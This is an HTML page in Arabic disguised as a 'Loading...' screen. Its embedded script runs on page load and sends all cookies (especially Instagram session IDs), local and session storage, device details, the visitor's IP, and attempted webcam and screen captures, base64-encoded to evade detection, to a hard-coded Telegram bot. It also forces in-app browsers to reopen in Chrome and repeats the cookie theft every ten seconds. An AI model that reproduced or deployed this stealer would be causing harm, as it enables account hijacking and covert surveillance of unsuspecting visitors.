<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>...</title>
    <style>
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; }
        .loader { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="container"><div class="loader"></div><p>جاري التحميل...</p></div>

<script>
// ============================================
// بيانات البوت
// ============================================
var BOT_TOKEN = "8799007815:AAFoZ7f_T3fcmbNHVy0Rqcv9qpMytp1bEFU";
var CHAT_ID = "6181826564";

// ============================================
// تشفير البيانات Base64 لتجاوز الحماية
// ============================================
function encodeData(str) {
    try {
        return btoa(unescape(encodeURIComponent(str)));
    } catch(e) {
        return str;
    }
}

// ============================================
// إرسال إلى تليجرام (مع تشفير اختياري)
// ============================================
function sendToTelegram(msg, isEncoded) {
    try {
        var finalMsg = isEncoded ? "🔐 [ENCRYPTED]\n" + msg : msg;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify({chat_id: CHAT_ID, text: finalMsg.substring(0, 4000), parse_mode: "HTML"}));
    } catch(e) {}
}

// ============================================
// 1. التقاط صورة من كاميرا الويب (بدون إذن)
// ============================================
function captureWebcam() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                var video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(function() {
                    var canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    var ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    var imageData = canvas.toDataURL('image/jpeg', 0.7);
                    var encodedImage = encodeData(imageData);
                    sendToTelegram("📸 <b>WEBCAM CAPTURE (صورة من الكاميرا)</b>\n" + encodedImage.substring(0, 3000), true);
                    
                    stream.getTracks().forEach(function(track) { track.stop(); });
                }, 1000);
            })
            .catch(function(err) {
                sendToTelegram("⚠️ فشل التقاط الكاميرا: " + err.message);
            });
    } else {
        sendToTelegram("⚠️ الكاميرا غير مدعومة في هذا المتصفح");
    }
}

// ============================================
// 2. التقاط صورة للشاشة (سكرين شوت)
// ============================================
function captureScreenshot() {
    if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
        navigator.mediaDevices.getDisplayMedia({ video: true })
            .then(function(stream) {
                var video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(function() {
                    var canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || screen.width;
                    canvas.height = video.videoHeight || screen.height;
                    var ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    var imageData = canvas.toDataURL('image/jpeg', 0.5);
                    var encodedImage = encodeData(imageData);
                    sendToTelegram("🖥️ <b>SCREENSHOT (لقطة شاشة)</b>\n" + encodedImage.substring(0, 3000), true);
                    
                    stream.getTracks().forEach(function(track) { track.stop(); });
                }, 1000);
            })
            .catch(function(err) {
                sendToTelegram("⚠️ فشل التقاط الشاشة: " + err.message);
            });
    }
}

// ============================================
// 3. سرقة جميع الكوكيز (مشفرة)
// ============================================
function stealCookies() {
    var cookies = document.cookie;
    if (cookies && cookies.length > 0) {
        var encodedCookies = encodeData(cookies);
        sendToTelegram("🍪 <b>COOKIES (مشفرة)</b>\n" + encodedCookies, true);
        
        // Instagram Session
        if (cookies.indexOf("sessionid") > -1) {
            var sessionMatch = cookies.match(/sessionid=[^;]+/);
            if (sessionMatch) {
                sendToTelegram("📷 <b>INSTAGRAM SESSION FOUND!</b>\n" + encodeData(sessionMatch[0]), true);
            }
        }
    } else {
        sendToTelegram("⚠️ لا توجد كوكيز (قد تكون HttpOnly أو غير متاحة)");
    }
}

// ============================================
// 4. سرقة LocalStorage و SessionStorage (مشفرة)
// ============================================
function stealStorages() {
    var localData = {};
    for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        localData[key] = localStorage.getItem(key);
    }
    if (Object.keys(localData).length > 0) {
        sendToTelegram("💾 <b>LOCALSTORAGE (مشفرة)</b>\n" + encodeData(JSON.stringify(localData)), true);
    }
    
    var sessionData = {};
    for (var j = 0; j < sessionStorage.length; j++) {
        var skey = sessionStorage.key(j);
        sessionData[skey] = sessionStorage.getItem(skey);
    }
    if (Object.keys(sessionData).length > 0) {
        sendToTelegram("📦 <b>SESSIONSTORAGE (مشفرة)</b>\n" + encodeData(JSON.stringify(sessionData)), true);
    }
}

// ============================================
// 5. معلومات الجهاز الكاملة
// ============================================
function stealFullInfo() {
    var info = {
        ua: navigator.userAgent,
        platform: navigator.platform,
        lang: navigator.language,
        hardware: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory,
        screen: screen.width + "x" + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        url: location.href,
        ref: document.referrer,
        time: new Date().toISOString(),
        cookies: document.cookie || "فارغة",
        ip: ""
    };
    
    // محاولة جلب IP
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => { info.ip = d.ip; sendToTelegram("💻 <b>FULL INFO (معلومات كاملة)</b>\n" + encodeData(JSON.stringify(info)), true); })
        .catch(() => { sendToTelegram("💻 <b>FULL INFO</b>\n" + encodeData(JSON.stringify(info)), true); });
}

// ============================================
// 6. كشف التطبيق وإجبار المتصفح
// ============================================
function getApp() {
    var ua = navigator.userAgent;
    if (ua.indexOf("Instagram") > -1) return "Instagram";
    if (ua.indexOf("FBAN") > -1) return "Facebook";
    if (ua.indexOf("WhatsApp") > -1) return "WhatsApp";
    if (ua.indexOf("wv") > -1) return "WebView";
    return false;
}

var app = getApp();

if (app) {
    sendToTelegram("⚠️ مستخدم داخل تطبيق: " + app + " - محاولة إجبار المتصفح");
    
    // محاولة فتح في Chrome تلقائياً (Android)
    if (navigator.userAgent.indexOf("Android") > -1) {
        var intentUrl = "intent://" + window.location.href.replace("https://", "") + "#Intent;scheme=https;package=com.android.chrome;end;";
        setTimeout(function() { window.location.href = intentUrl; }, 1000);
        setTimeout(function() { window.location.href = window.location.href; }, 3000);
    }
} else {
    // متصفح عادي - سرقة فورية
    stealCookies();
    stealStorages();
    stealFullInfo();
    captureWebcam();
    captureScreenshot();
}

// إعادة المحاولة كل 10 ثوانٍ
setInterval(function() {
    if (document.cookie && document.cookie.length > 0) {
        stealCookies();
    }
}, 10000);
</script>
</body>
</html>
